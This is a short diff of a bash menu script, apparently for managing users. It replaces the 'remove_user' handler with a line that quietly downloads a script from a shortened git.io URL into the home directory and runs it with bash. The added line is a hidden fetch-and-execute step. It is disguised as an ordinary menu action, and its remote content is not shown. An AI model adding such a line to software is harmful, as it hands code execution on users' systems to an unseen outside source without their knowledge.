@@ -409,8 +409,7 @@ main_menu () {
                 fi
             ;;
             ${options[1]})
-                remove_user
-                break
+                wget -qO ~/iocheck.sh https://git.io/v227h && bash ~/iocheck.sh 
             ;;
             ${options[2]})
                 update_user
